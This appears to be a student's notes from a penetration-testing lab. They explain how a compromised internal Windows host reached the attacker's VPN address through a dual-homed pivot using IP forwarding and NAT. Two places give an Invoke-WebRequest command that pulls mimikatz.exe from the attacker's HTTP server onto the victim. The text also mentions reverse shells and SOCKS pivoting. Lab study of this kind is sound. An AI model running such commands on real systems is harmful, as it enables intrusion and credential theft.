# Routing in VPNs

Invoke-WebRequest -Uri "http://10.10.200.2:8000/mimikatz.exe" -OutFile "C:\Users\john\Downloads\mimi.exe"

how this happened actually we are connected with openvpn to the machine and then we did port forwarding through a pivot machine and then lateral movement then how this machine is able to send traffic to my network interface ? 



The internal machine is able to reach your Python HTTP server because the OpenVPN server acts as a standard IP router that maintains a route back to your VPN client IP.

Here is the exact network path that makes this work:

* **Your IP Space:** When you run `python3 -m http.server 8000` on your attacker box, it binds to `0.0.0.0`, including your assigned VPN IP (`10.10.200.2` on interface `tun0`).
* **The Pivot's Routing Role:** Your pivot host sits on two networks: the lab/VPN transit subnet (`10.10.200.0/24`) and the target Active Directory subnet (`192.168.98.0/24`). The lab infrastructure sets the pivot host (or an internal gateway) as the default gateway for the `192.168.98.0/24` network.
* **Outbound Routing (Victim $\rightarrow$ Attacker):**
1. Target `192.168.98.30` receives the command to fetch `[http://10.10.200.2:8000](http://10.10.200.2:8000)`.
2. Because `10.10.200.2` is outside its local subnet (`192.168.98.0/24`), it hands the SYN packet to its default gateway (the pivot host or router).
3. The router/pivot sees the destination is `10.10.200.2` and forwards the packet directly across the VPN tunnel interface to your attacker machine.


* **Return Routing (Attacker $\rightarrow$ Victim):**
1. Your web server answers with a SYN-ACK directed to `192.168.98.30`.
2. The OpenVPN server routes traffic destined for `192.168.98.0/24` through the pivot interface, completing the standard 3-way TCP handshake.

## Another explanation

When you caught a reverse shell and executed `Invoke-WebRequest` without setting up a manual SSH tunnel or port forward, the pivot machine handled that traffic through **standard kernel routing and NAT (Network Address Translation)**.

Here is the exact step-by-step mechanism of what happened inside the pivot host:

**Dual-Homed Network Position**
The pivot host has two network interfaces:

* `eth0` (or `tun0`): Facing the external/VPN transit network where your attacker machine lives (`10.10.200.x` or `192.168.80.x`).
* `eth1`: Facing the internal Active Directory network (`192.168.98.0/24`).

**IP Forwarding Enabled in Kernel**
Linux systems do not pass packets between interfaces by default unless IP forwarding is enabled in the kernel (`sysctl net.ipv4.ip_forward=1`). In lab environments like CRTA, the foothold host is configured as a network router. When a packet enters `eth1` destined for an IP address outside its subnet, the Linux kernel looks at its internal routing table rather than discarding the packet.

**Default Gateway Pointing to the Pivot**
The internal Windows machine (`192.168.98.30`) has its network adapter configured with a default gateway pointing directly to the pivot's internal IP (e.g., `192.168.98.1` or the pivot's `eth1` address).

When you executed:

```powershell
Invoke-WebRequest -Uri "http://10.10.200.2:8000/mimikatz.exe"

```

The Windows TCP/IP stack evaluated `10.10.200.2`, determined it was not in `192.168.98.0/24`, and forwarded the ethernet frame directly to the pivot's MAC address.

**IP Masquerading (iptables NAT)**
Once the pivot machine receives the packet on `eth1`, it rewrites the packet using a NAT `MASQUERADE` rule:

1. **Source Rewrite (SNAT):** The pivot takes the packet coming from `192.168.98.30`, swaps the source IP with its own external/VPN IP address, and emits it over the external interface toward your VPN interface (`10.10.200.2`).
2. **State Tracking (Conntrack):** The Linux kernel adds an entry to its connection tracking table (`nf_conntrack`), remembering that connection stream.
3. **Response Handling:** When your Python HTTP server answers with the file data, it sends the response back to the pivot's IP. The pivot matches the packet against its connection table, swaps the destination back to `192.168.98.30`, and sends it across `eth1` to the Windows machine.

Because the pivot machine was operating as an active router/NAT gateway for the `.98.0/24` subnet, any outbound connection initiated by an internal target (whether a reverse shell or an HTTP download) flows back to your listener automatically without requiring manual SSH remote forwarding (`-R`) or chisel reverse tunnels.



### Why Port Forwarding / SOCKS Wasn't Needed Here

* **Inbound vs. Outbound Directionality:** You used `proxychains` and SOCKS port forwarding to reach **inbound** from your box into hosts in the `192.168.98.0/24` network because those internal IP addresses are not publicly routable from outside the VPN network boundaries.
* **Symmetric Routing:** Once the target host initiates an **outbound** request directly to your explicit VPN IP (`10.10.200.2`), it does not go through ProxyChains. It relies purely on the kernel routing table of the internal lab router/pivot to deliver packets across the VPN subnet.